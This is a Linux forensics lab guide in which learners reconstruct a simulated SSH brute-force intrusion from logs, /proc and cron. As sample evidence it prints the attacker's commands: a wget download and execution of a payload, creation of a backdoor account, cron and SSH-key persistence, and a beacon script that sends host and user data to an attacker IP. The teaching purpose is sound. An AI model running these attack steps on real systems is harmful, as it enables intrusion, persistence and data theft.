# Demo 04: Linux Forensics Basics

**Estimated time:** 40 minutes

---

## Overview

A Docker container is pre-configured with realistic forensic evidence of a Linux compromise.
You will analyze bash history, `/var/log` files, the `/proc` filesystem, cron jobs, and auditd logs to reconstruct an attack timeline.
The scenario mirrors a real intrusion where an attacker:

1. Brute-forced SSH
1. Escalated privileges via a vulnerable sudo configuration
1. Established cron-based persistence
1. Added a backdoor SSH key
1. Attempted to cover tracks

---

## Learning Objectives

* Parse bash_history to reconstruct attacker commands
* Analyze wtmp/btmp/lastlog for login anomalies
* Use /proc to investigate live processes and detect deleted executables
* Enumerate cron jobs for persistence indicators
* Search auditd logs for privilege escalation and file access events
* Build a complete incident timeline from multiple log sources

---

## Prerequisites

* Docker installed and running

---

## Setup

```console
cd demos/demo-04-linux-forensics
docker compose up --build
docker compose exec linux-forensics bash
```

---

## Step 1: Bash History Analysis

```console
# Review all users' bash histories
echo "=== Root bash history ==="
cat /root/.bash_history

echo "=== www-data bash history (service account!) ==="
cat /var/www/.bash_history 2>/dev/null || echo "(no history file)"

echo "=== alice bash history ==="
cat /home/alice/.bash_history
```

**Expected findings in alice's history:**

```text
# Legitimate commands before the incident:
ls -la
cd /var/www/html
vi index.html

# INCIDENT BEGINS (attacker has alice's session):
id
whoami
cat /etc/passwd
cat /etc/shadow    # Attempted — probably failed (no shadow access as alice)
sudo -l            # Checking sudo privileges
sudo su -          # Root escalation via sudo!
# --- Now as root ---
wget http://10.0.5.123/payload.sh -O /tmp/.update.sh
chmod +x /tmp/.update.sh
/tmp/.update.sh
useradd -m -s /bin/bash -G sudo backdoor_user
echo "backdoor_user:P@ssw0rd2024!" | chpasswd
echo "* * * * * root /tmp/.update.sh" >> /etc/crontab
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...attacker@kali" >> /root/.ssh/authorized_keys
history -c    # Clear history (but we can still see it in our logs!)
```

```bash
# Look for attacker TTPs in history files
for user_home in /root /home/*; do
    if [ -f "$user_home/.bash_history" ]; then
        user=$(basename $user_home)
        echo "=== $user ==="
        # Highlight suspicious commands
        grep -E "wget|curl|nc |python.*-c|bash.*-i|chmod.*s|useradd|passwd|crontab|ssh-.*authorized" \
             "$user_home/.bash_history" | while read cmd; do
            echo "  SUSPICIOUS: $cmd"
        done
    fi
done
```

---

## Step 2: Login History Analysis — wtmp, btmp, lastlog

```bash
# Review successful login history (from /var/log/wtmp)
echo "=== Login History (last -i -F) ==="
last -i -F | head -30

# Expected output:
# backdoor_user pts/1  10.0.5.123  Mon Jan 15 09:10:00 2024  still logged in
# alice         pts/0  10.0.5.123  Sun Jan 14 14:47:23 2024  Sun Jan 14 15:05:00 2024
# alice         pts/0  192.168.1.5  Sun Jan 14 09:00:00 2024  Sun Jan 14 09:30:00 2024
# root          tty1  -            Thu Jan 11 08:00:00 2024  Thu Jan 11 08:15:00 2024

# Suspicious observations:
# - alice logged in from 10.0.5.123 (different IP than usual 192.168.1.5)
# - backdoor_user logged in the next day (newly created account!)
```

```bash
# Review failed login attempts (from /var/log/btmp)
echo "=== Failed Login Attempts (lastb -i -F) ==="
lastb -i -F | head -30

# Expected output:
# alice  ssh:notty  10.0.5.123  Sun Jan 14 14:23:01 2024  (247 failures total)
# root   ssh:notty  10.0.5.123  Sun Jan 14 14:20:00 2024
# admin  ssh:notty  10.0.5.123  Sun Jan 14 14:15:00 2024

# Count failures by IP
lastb -i -F 2>/dev/null | awk '{print $3}' | grep -v "btmp" | sort | uniq -c | sort -rn

# 247 failures from 10.0.5.123 = brute force attack
```

```console
# Check last login times per user
echo "=== Last Login Per User (lastlog) ==="
lastlog | grep -v "Never"

# Alert: backdoor_user has a recent login despite being a new account
# Alert: alice's last login is from a different IP than normal
```

---

## Step 3: /proc Filesystem — Live Process Investigation

```bash
# Get a full process snapshot
ps auxef

# Look for suspicious patterns:
# - Processes running from /tmp or /dev/shm
# - nc (netcat) processes
# - Python/bash processes spawned from unusual parents
# - Processes with no controlling terminal (nohup'd processes)

ps auxef | grep -E "tmp|shm|nc |python.*-c|bash.*-i" | grep -v grep

# Deep inspection of suspicious PIDs
SUSPICIOUS_PID=$(ps aux | grep "/tmp/" | grep -v grep | awk '{print $2}' | head -1)
if [ -n "$SUSPICIOUS_PID" ]; then
    echo "=== Investigating PID: $SUSPICIOUS_PID ==="

    # Get full command line
    echo "CMD: $(cat /proc/$SUSPICIOUS_PID/cmdline 2>/dev/null | tr '\0' ' ')"

    # Check if executable exists (malware often deletes itself)
    echo "EXE: $(ls -la /proc/$SUSPICIOUS_PID/exe 2>/dev/null)"

    # Get working directory
    echo "CWD: $(ls -la /proc/$SUSPICIOUS_PID/cwd 2>/dev/null)"

    # Open network connections for this process
    echo "NET: $(ss -tnp | grep pid=$SUSPICIOUS_PID)"
fi
```

```bash
# CRITICAL CHECK: Find processes with deleted executables
# (Malware deletes its file after execution — stays running in memory)
echo "=== Processes with DELETED executables ==="
ls -la /proc/*/exe 2>/dev/null | grep "(deleted)"

# If found:
# lr-x------ lrwxrwxrwx 0 root root 0 /proc/1234/exe -> /tmp/.update.sh (deleted)
# The file is gone from disk but still running!

# You can RECOVER the deleted binary:
# MALWARE_PID=1234
# cp /proc/$MALWARE_PID/exe /tmp/recovered_malware
# sha256sum /tmp/recovered_malware  # Hash for threat intel lookup
```

```bash
# Check environment variables for all processes (may contain C2 config)
for pid in /proc/[0-9]*/; do
    pid_num=$(basename $pid)
    cmdline=$(cat $pid/cmdline 2>/dev/null | tr '\0' ' ')
    if echo "$cmdline" | grep -qE "tmp|shm|update|svc"; then
        echo "PID $pid_num CMD: $cmdline"
        echo "ENV: $(cat $pid/environ 2>/dev/null | tr '\0' '\n' | grep -E "C2|SERVER|HOST|KEY" 2>/dev/null)"
    fi
done
```

---

## Step 4: Cron Job Forensics

```bash
# Comprehensive cron enumeration
echo "=== /etc/crontab ==="
cat /etc/crontab

echo ""
echo "=== /etc/cron.d/ ==="
ls -la /etc/cron.d/
for f in /etc/cron.d/*; do
    echo "--- $f ---"
    cat "$f"
done

echo ""
echo "=== User Crontabs ==="
ls -la /var/spool/cron/crontabs/ 2>/dev/null
for user in $(ls /var/spool/cron/crontabs/ 2>/dev/null); do
    echo "--- crontab for $user ---"
    cat /var/spool/cron/crontabs/$user
done
```

**Red flags to find:**

```bash
# The incident added this to /etc/crontab:
# * * * * *  root  /tmp/.update.sh
# = runs every minute as root — command-and-control beacon

# Check for recently modified cron files
echo "=== Cron Files Modified in Last 7 Days ==="
find /etc/cron* /var/spool/cron -newer /var/log/dpkg.log 2>/dev/null -ls

# Check cron execution logs
echo "=== Cron Job Executions (auth.log/syslog) ==="
grep "cron" /var/log/syslog | tail -20
grep "CRON" /var/log/syslog | grep "\.update" | tail -20
```

```bash
# Find the malicious cron script and analyze it
echo "=== Malicious Cron Script (if present) ==="
cat /tmp/.update.sh 2>/dev/null || echo "File deleted from disk (check /proc)"

# Expected contents:
# #!/bin/bash
# # "Windows update service"
# curl -s http://10.0.5.123:8080/beacon -d "host=$(hostname)&user=$(id)" > /dev/null 2>&1
# if [ -f /tmp/.cmd ]; then
#     bash /tmp/.cmd
#     rm /tmp/.cmd
# fi
```

---

## Step 5: auditd Log Analysis

```console
# Review all privilege escalation events
echo "=== Privilege Escalation (sudo usage) ==="
ausearch -k privileged-sudo -i 2>/dev/null | grep -A5 "SYSCALL\|EXECVE\|PATH"

# Expected output:
# type=EXECVE msg=audit(1705244883.123:456): argc=3 a0="sudo" a1="su" a2="-"
# type=PATH msg=...: item=0 name="/usr/bin/sudo" inode=... nametype=NORMAL
# uid=1000 auid=1000 (alice's UID)
```

```console
# Review identity-critical file modifications
echo "=== Critical File Modifications ==="
ausearch -k identity -i 2>/dev/null | grep -E "SYSCALL|PATH|time=" | head -40

# Look for:
# - /etc/passwd being modified (useradd creating backdoor_user)
# - /etc/shadow being modified (password being set)
# - /etc/sudoers being modified
```

```console
# Review SSH key changes
echo "=== SSH Authorized Key Modifications ==="
ausearch -k ssh-keys -i 2>/dev/null | tail -20

# Should show the attacker writing to /root/.ssh/authorized_keys
```

```console
# Generate a comprehensive audit report
echo "=== Full Audit Report Summary ==="
aureport --summary 2>/dev/null
echo ""
aureport --auth --summary 2>/dev/null
echo ""
echo "=== Failed Events ==="
aureport --failed 2>/dev/null | head -20
```

---

## Step 6: Auth Log Analysis

```bash
# Full auth.log parsing for the incident window
echo "=== Brute Force Detection ==="
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -10

echo ""
echo "=== Successful Logins ==="
grep "Accepted" /var/log/auth.log

echo ""
echo "=== sudo Commands Executed ==="
grep "COMMAND" /var/log/auth.log | awk '{print $3, $11, $14}'

echo ""
echo "=== New Account Creation ==="
grep "useradd\|adduser" /var/log/auth.log

echo ""
echo "=== Password Changes ==="
grep "passwd" /var/log/auth.log | grep -v "Failed\|Accepted"
```

---

## Step 7: Build the Linux Incident Timeline

```console
# Run the timeline builder
/scripts/build-timeline.sh
```

**Expected output:**

```text
=== LINUX INCIDENT TIMELINE ===

14:15:00  Brute force begins: failed SSH attempts for 'admin', 'root' from 10.0.5.123
14:20:00  Brute force continues targeting 'alice'
14:23:01  247 × Failed password for alice from 10.0.5.123
14:47:23  Accepted password for alice from 10.0.5.123 ssh2
14:47:30  alice: cat /etc/passwd (credential reconnaissance)
14:47:45  alice: sudo -l (privilege check)
14:47:55  alice: sudo su - (root escalation — MISCONFIGURED SUDO!)
14:48:10  root: wget http://10.0.5.123/payload.sh -O /tmp/.update.sh
14:48:15  root: chmod +x /tmp/.update.sh; /tmp/.update.sh
14:48:30  root: useradd backdoor_user (new account created)
14:48:35  root: echo backdoor_user:... | chpasswd (password set)
14:48:40  root: usermod -aG sudo backdoor_user
14:48:50  root: echo "* * * * * root /tmp/.update.sh" >> /etc/crontab
14:49:00  root: mkdir -p /root/.ssh; echo "ssh-rsa AAAA..." >> authorized_keys
14:49:10  root: history -c (attempts to clear history)
14:55:00  alice's SSH session ends
15:00:01  CRON: root ran /tmp/.update.sh (first minute-job execution)
--- next day ---
09:10:00  Accepted password for backdoor_user from 10.0.5.123
```

---

## Step 8: Containment Verification

```bash
# After investigation, verify what the attacker left behind
echo "=== Post-Incident Artifact Survey ==="

echo "1. Backdoor accounts:"
awk -F: '($3 >= 1000 && $7 != "/usr/sbin/nologin" && $7 != "/bin/false") {print $1, "UID:"$3}' /etc/passwd

echo ""
echo "2. Suspicious cron entries:"
grep -v "^#\|^$" /etc/crontab | grep -v "SHELL\|PATH\|MAILTO"
grep -rh "" /etc/cron.d/ 2>/dev/null | grep -v "^#\|^$"

echo ""
echo "3. SSH authorized keys:"
find /root /home -name "authorized_keys" -exec echo "=== {} ===" \; -exec cat {} \;

echo ""
echo "4. SUID binaries (compare to baseline):"
find / -perm -4000 -type f 2>/dev/null | sort

echo ""
echo "5. Files in /tmp:"
ls -la /tmp/

echo ""
echo "6. Unusual network connections:"
ss -tnp | grep -v "127.0.0.1\|::1"
```

---

## Clean Up

```console
docker compose down
```

---

## Key Takeaways

* **bash_history** captures attacker commands, but can be cleared — auditd provides fallback
* **wtmp/btmp** binary files record logins reliably; `last -i` and `lastb -i` show IP addresses
* **/proc** reveals running processes including ones with deleted executables (malware still in memory)
* **Cron jobs** are a primary Linux persistence mechanism; always check all cron locations
* **auditd** with identity/sudo/cron rules captures the complete privilege escalation chain
* **Multiple log sources** must be correlated to build a complete timeline — no single source is sufficient
* **history -c** cannot erase auditd records; auditd captures the execve() syscalls regardless
